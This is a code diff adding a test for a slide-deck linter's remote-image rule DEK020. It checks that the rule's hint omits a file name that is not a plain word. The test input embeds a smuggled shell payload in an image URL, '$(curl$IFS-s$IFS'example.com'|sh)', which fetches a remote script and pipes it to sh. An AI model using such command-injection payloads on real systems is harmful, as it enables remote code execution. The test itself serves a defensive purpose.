@@ -2047,6 +2047,15 @@ two
     const hint = diagnostics.find((d) => d.id === "DEK020")?.hint;
     expect(hint).toBe("download it into assets/ and use assets/logo.png");
   });
+
+  test("DEK020 names the file only when its name is a plain word", async () => {
+    const diagnostics = await lintIntro(`<section class="slide" data-layout="title">
+  <h2 class="slide-title">intro</h2>
+  <img src="https://example.com/x$(curl$IFS-s$IFS'example.com'|sh).png" alt="">
+</section>`);
+    const hint = diagnostics.find((d) => d.id === "DEK020")?.hint;
+    expect(hint).toBe("download it into assets/ and reference it from there");
+  });
 });
 
 describe("lintDeck locations and data", () => {
